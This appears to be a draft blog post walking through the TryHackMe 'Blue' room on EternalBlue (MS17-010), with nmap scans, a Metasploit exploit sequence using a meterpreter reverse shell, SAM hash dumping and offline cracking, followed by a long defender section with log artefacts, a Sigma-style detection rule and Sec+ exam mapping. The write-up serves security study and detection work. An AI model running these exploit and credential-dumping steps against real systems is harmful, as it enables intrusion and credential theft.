---
title: "WriteUp: Blue — TryHackMe | Easy"
slug: writeup-thm-blue
status: draft
tags: [ctf-writeup, tryhackme, teaser]
excerpt: "An easy Windows machine covering MS17-010 (EternalBlue), SMBv1 exploitation, and credential dumping. Full walkthrough in preparation."
format: html  # body is Ghost-ready HTML; restore via Admin API posts?source=html
---

<h1 id="blue-%E2%80%94-tryhackme">Blue — TryHackMe</h1><blockquote><strong>Preparation stub.</strong> Based on publicly documented information about this well-known retired<br>room — not an original solve, and no live flag values are recorded. Use this as a study scaffold;<br>complete the bracketed fields when working the room under your own account. Only document legally<br>authorised activity.</blockquote><h2 id="engagement-metadata">Engagement metadata</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Field</th>
<th>Value</th>
</tr>
</thead>
<tbody>
<tr>
<td>Platform</td>
<td>TryHackMe</td>
</tr>
<tr>
<td>Room</td>
<td>Blue</td>
</tr>
<tr>
<td>Difficulty</td>
<td>Easy</td>
</tr>
<tr>
<td>Category</td>
<td>Windows</td>
</tr>
<tr>
<td>Target IP</td>
<td>10.x.x.x (lab-assigned)</td>
</tr>
<tr>
<td>Date completed</td>
<td>[YYYY-MM-DD]</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="executive-summary">Executive summary</h2><p>A Windows host exposed to the <strong>EternalBlue</strong> SMBv1 vulnerability (<strong>MS17-010</strong>). Exploitation<br>yields a SYSTEM-level shell directly, after which credentials are dumped and the flags collected.<br>The room teaches the canonical "unpatched SMB → full compromise" path that underpinned WannaCry.</p><h2 id="scenario-value-study-scaffold">Scenario value (study scaffold)</h2><ul><li><strong>What it tests:</strong> identifying a critical unauthenticated RCE from a service banner + vuln scan, and<br>the "single unpatched legacy service → full compromise" lesson.</li><li><strong>What completing it demonstrates:</strong> confident use of <code>nmap</code> vuln NSE, the EternalBlue exploit<br>(Metasploit <em>and</em> the manual AutoBlue path), post-exploitation (migrate, hashdump, offline crack),<br>and the blue-team transfer — why SMBv1 must be disabled and patched (MITRE T1210).</li></ul><h2 id="key-vulnerability-class">Key vulnerability class</h2><ul><li><strong>CWE/Class:</strong> Remote code execution via memory corruption in SMBv1 (<code>srv.sys</code>).</li><li><strong>Identifier:</strong> <strong>MS17-010</strong> (CVEs in the 2017-0143…0148 range; EternalBlue is commonly tied to<br><strong>CVE-2017-0144</strong>). <em>Verify the exact CVE when citing.</em></li><li><strong>Why it matters:</strong> the same flaw weaponised by WannaCry/NotPetya in 2017 — the textbook example<br>of why legacy SMBv1 must be disabled and patches applied promptly.</li></ul><h2 id="1-reconnaissance">1. Reconnaissance</h2><pre><code>nmap -sC -sV -p- -oA nmap/blue 10.x.x.x
nmap --script smb-vuln-ms17-010 -p445 10.x.x.x
</code></pre><p>Expected exposed surface (confirm on completion):</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Port</th>
<th>Service</th>
<th>Note</th>
</tr>
</thead>
<tbody>
<tr>
<td>135/tcp</td>
<td>msrpc</td>
<td>Windows RPC endpoint mapper</td>
</tr>
<tr>
<td>139/tcp</td>
<td>netbios-ssn</td>
<td>NetBIOS session</td>
</tr>
<tr>
<td>445/tcp</td>
<td>microsoft-ds</td>
<td><strong>SMB — the vector</strong></td>
</tr>
<tr>
<td>3389/tcp</td>
<td>ms-wbt-server</td>
<td>RDP (often present, not the path)</td>
</tr>
<tr>
<td>49152+/tcp</td>
<td>msrpc</td>
<td>High dynamic RPC ports</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p>The <code>smb-vuln-ms17-010</code> NSE script should report the host as <strong>VULNERABLE</strong>. [Paste trimmed scan<br>output on completion.]</p><p><strong>nmap flag rationale:</strong></p><ul><li><code>-p-</code> — all 65,535 TCP ports; confirms the RPC/NetBIOS/SMB/RDP Windows fingerprint and any high<br>dynamic RPC ports (49152+).</li><li><code>-sV</code> — version detection; the <code>microsoft-ds</code> banner and OS version are what flag the host as a<br>legacy SMBv1 target.</li><li><code>-sC</code> — default scripts for quick OS-discovery hints.</li><li><code>--script smb-vuln-ms17-010</code> — the targeted <strong>vulnerability</strong> NSE script. This is the decisive<br>scan: it actively checks the MS17-010 patch state rather than inferring from the version.</li><li><code>-oA nmap/blue</code> — keep the VULNERABLE verdict as evidence.</li></ul><p><strong>What to look for in the scan:</strong> the <code>smb-vuln-ms17-010</code> script result reading <strong>VULNERABLE</strong>, plus<br>the Windows port fingerprint (135/139/445 and often 3389). On a real network this NSE probe is<br>itself loud — note that it generates the very SMB traffic a defender would alert on (see §8).</p><h2 id="2-enumeration">2. Enumeration</h2><pre><code>nmap --script "smb-os-discovery,smb-security-mode" -p445 10.x.x.x
</code></pre><ul><li>Confirm the Windows version (typically Windows 7 / Server 2008 R2 era) and that <strong>SMBv1</strong> is<br>enabled and <strong>message signing is not required</strong> — both preconditions for EternalBlue.</li><li>The single load-bearing fact is the <code>smb-vuln-ms17-010</code> = VULNERABLE result; the rest is<br>confirmation. [Record OS-discovery output on completion.]</li></ul><p><strong>What to look for after SMB enumeration:</strong> two preconditions confirmed — <code>smb-security-mode</code> shows<br><strong>message signing is not required</strong> (so the pool-grooming exploit is not blocked), and<br><code>smb-os-discovery</code> dates the host to the Windows 7 / Server 2008 R2 era where SMBv1 is on by<br>default. If signing were <em>required</em>, EternalBlue would be a far harder path — the enumeration is<br>what tells you the exploit will actually land.</p><h2 id="3-exploitation">3. Exploitation</h2><pre><code># Metasploit path
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.x.x.x
set LHOST &lt;tun0 ip&gt;
set payload windows/x64/meterpreter/reverse_tcp
exploit
</code></pre><ul><li>The exploit corrupts SMBv1 pool memory to gain kernel execution <strong>[ATT&amp;CK T1210 — Exploitation</strong><br><strong>of Remote Services]</strong>; the resulting shell typically lands <strong>already as <code>NT AUTHORITY\SYSTEM</code></strong> —<br>no privilege-escalation step is required. The subsequent <code>migrate</code> into a stable process is<br><strong>[ATT&amp;CK T1055 — Process Injection]</strong> and the SAM dump is <strong>[ATT&amp;CK T1003.002 — OS Credential</strong><br><strong>Dumping: Security Account Manager]</strong>.</li><li><strong>Manual/alternative path:</strong> the standalone <code>AutoBlue-MS17-010</code> scripts (<code>eternalblue_exploit*.py</code><br>plus a shellcode generator) achieve the same without Metasploit — worth doing once to understand<br>the kernel-shellcode delivery rather than treating it as a black box.</li><li><strong>User flag:</strong> <code>[capture on completion]</code></li><li><strong>Root/SYSTEM flag:</strong> <code>[capture on completion]</code></li></ul><h2 id="4-post-exploitation">4. Post-exploitation</h2><pre><code># from meterpreter
getuid                # expect NT AUTHORITY\SYSTEM
ps                    # find a stable x64 process to migrate into
migrate &lt;PID&gt;         # e.g. a spoolsv.exe / lsass-adjacent process
hashdump              # dump local SAM NTLM hashes
</code></pre><ul><li><strong>Migrate early.</strong> The initial EternalBlue process can be unstable; move into a stable native<br>process before further work.</li><li>Dump the SAM with <code>hashdump</code>; the room walks through cracking the recovered NTLM hash offline<br>(<code>john</code>/<code>hashcat</code> against <code>rockyou.txt</code>).</li><li>Flags are placed around the filesystem (search the typical user/root locations); collect all three.</li></ul><h2 id="5-tools-used">5. Tools used</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Phase</th>
<th>Tools</th>
</tr>
</thead>
<tbody>
<tr>
<td>Recon</td>
<td><code>nmap</code> (<code>-sC -sV -p-</code>, <code>--script smb-vuln-ms17-010</code>)</td>
</tr>
<tr>
<td>Enumeration</td>
<td><code>nmap</code> NSE (<code>smb-os-discovery</code>, <code>smb-security-mode</code>)</td>
</tr>
<tr>
<td>Exploitation</td>
<td>Metasploit (<code>ms17_010_eternalblue</code>) or AutoBlue-MS17-010</td>
</tr>
<tr>
<td>Post-exploitation</td>
<td>meterpreter (<code>migrate</code>, <code>hashdump</code>), <code>john</code>/<code>hashcat</code> (offline NTLM crack)</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="6-mitre-attck-mapping">6. MITRE ATT&amp;CK mapping</h2><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>Tactic</th>
<th>Technique</th>
<th>ID</th>
</tr>
</thead>
<tbody>
<tr>
<td>Initial Access</td>
<td>Exploit Public-Facing Application</td>
<td>T1190</td>
</tr>
<tr>
<td>Execution / Lateral</td>
<td>Exploitation of Remote Services</td>
<td>T1210</td>
</tr>
<tr>
<td>Credential Access</td>
<td>OS Credential Dumping: SAM</td>
<td>T1003.002</td>
</tr>
<tr>
<td>Defense Evasion</td>
<td>Process Injection / Migration</td>
<td>T1055</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><h2 id="7-key-learnings">7. Key learnings</h2><ul><li><strong>SMBv1/MS17-010 is a kill shot</strong> — full SYSTEM from a single unpatched service; demonstrates why<br>patch management and disabling legacy SMB are non-negotiable.</li><li><strong>Process migration matters</strong> — the initial EternalBlue process can be unstable; migrate before<br>doing further work.</li><li><strong>Do the manual exploit once.</strong> Running AutoBlue rather than the Metasploit module forces you to<br>understand the kernel-shellcode delivery — useful when a module is unavailable or disallowed.</li><li><strong>Detection note (blue-team transfer):</strong> MS17-010 exploitation is loud — anomalous SMBv1 traffic<br>and the spawned SYSTEM process are detectable; map to MITRE <strong>T1210</strong>. Defensive control: disable<br>SMBv1 entirely and require SMB signing.</li></ul><h2 id="8-defender-perspective-%E2%80%94-logs-detection">8. Defender perspective — logs &amp; detection</h2><p>What this attack looks like from a monitored SOC, and the rule that would catch it. EternalBlue is<br>loud — this is one of the more detectable exploits, which is exactly why it is a good blue-team<br>teaching case. (See <a href="../methodology/ctf-methodology.md">../methodology/ctf-methodology.md §7</a>.)</p><p><strong>Log artefacts generated:</strong></p><ul><li><strong>Network (the strongest signal):</strong> anomalous SMBv1 traffic to 445 with the EternalBlue<br>pool-grooming pattern — oversized/<code>NT Trans</code> requests, the <code>\PIPE\</code> transaction abuse. An IDS<br>with the ET/Snort <code>ms17-010</code> signatures fires here; Zeek <code>smb.log</code> shows the SMBv1 session.</li><li><strong>The NSE/vuln scan itself</strong> (<code>smb-vuln-ms17-010</code>) generates probe traffic to 445 that an alert<br>network monitor flags before exploitation even begins.</li><li><strong>Windows Security log:</strong> the SYSTEM shell spawns processes — <strong>Event ID 4688</strong> (process<br>creation) with unusual parents, and <strong>4624 logon type 3</strong> anomalies around the SMB session.</li><li><strong>Sysmon Event ID 1:</strong> <code>services.exe</code>/<code>spoolsv.exe</code> or a migrated process spawning <code>cmd.exe</code>;<br>Sysmon <strong>Event ID 8</strong> (CreateRemoteThread) on the <code>migrate</code> step is a classic injection tell.</li><li><strong>Credential dumping:</strong> SAM access for <code>hashdump</code> — Sysmon process access to <code>lsass</code>/registry<br>hive reads (<strong>Event ID 4656/4663</strong> on the SAM).</li></ul><p><strong>Example detection logic (Sigma-style + network):</strong></p><pre><code class="language-yaml">title: EternalBlue SMBv1 exploitation (MS17-010)
detection:
  smb_signature:        # network IDS
    alert: 'ET EXPLOIT possible ETERNALBLUE MS17-010 Echo Response'
  host_followup:        # Sysmon
    Image|endswith: '\cmd.exe'
    ParentImage|endswith: ['\services.exe', '\spoolsv.exe', '\lsass.exe']
  condition: smb_signature OR host_followup
level: critical
</code></pre><p><strong>Why it fires:</strong> EternalBlue must speak malformed SMBv1 to corrupt kernel memory — there is no<br>stealthy version of the network stage, so signature IDS catches the <em>delivery</em> and Sysmon catches<br>the <em>post-exploitation</em> (injection + LSASS/SAM access). This box is the canonical "single unpatched<br>service → full compromise, but extremely noisy" lesson. Maps to <strong>ATT&amp;CK T1210 / T1055 / T1003.002</strong>.</p><p><strong>Defensive controls:</strong> disable SMBv1 entirely; apply MS17-010; require SMB signing; segment and<br>firewall 445 from untrusted networks; deploy Sysmon with LSASS-access and CreateRemoteThread rules.</p><h2 id="exam-relevance-%E2%80%94-sec-sy0-701">Exam relevance — Sec+ SY0-701</h2><p>Why this room is hands-on revision for the certificate, not a detour from it:</p><!--kg-card-begin: html--><table>
<thead>
<tr>
<th>SY0-701 objective</th>
<th>How Blue makes it concrete</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>2.3</strong> Vulnerability types</td>
<td>A legacy, unpatched OS service (SMBv1 / MS17-010) is the textbook "vulnerable / legacy software" the exam asks you to recognise.</td>
</tr>
<tr>
<td><strong>2.4</strong> Indicators of malicious activity</td>
<td>The §8 IoCs — anomalous SMBv1 traffic, 4688 process creation, LSASS/SAM access — are exactly the application/network attack indicators the exam tests.</td>
</tr>
<tr>
<td><strong>2.5 / 4.1</strong> Mitigation &amp; hardening</td>
<td>Disable SMBv1, apply MS17-010, require SMB signing, segment 445 — the patch-management and protocol-hardening answers, seen from the attacker's side.</td>
</tr>
<tr>
<td><strong>4.4</strong> Vulnerability management</td>
<td>The <code>smb-vuln-ms17-010</code> NSE script is a vulnerability <em>scan</em>; mapping the verdict to a CVE is the identify→prioritise→remediate cycle.</td>
</tr>
<tr>
<td><strong>1.4 / 2.4</strong> Password attacks</td>
<td>The offline NTLM crack (<code>john</code>/<code>hashcat</code> vs rockyou) is the exam's "offline brute-force / password attack" made real.</td>
</tr>
</tbody>
</table><!--kg-card-end: html--><p><strong>Interview line:</strong> "I run rooms like Blue specifically to turn Sec+ objectives into muscle memory —<br>exploiting MS17-010 is how I <em>understand</em> why the exam treats patch management and legacy-protocol<br>disablement as non-negotiable, instead of just memorising it."</p><h2 id="9-references">9. References</h2><ul><li>MS17-010 / EternalBlue (verify exact CVE before citing).</li><li>Metasploit <code>ms17_010_eternalblue</code> module documentation.</li><li>AutoBlue-MS17-010 (manual exploitation reference).</li><li>MITRE ATT&amp;CK T1210, T1055, T1003.002.</li></ul>
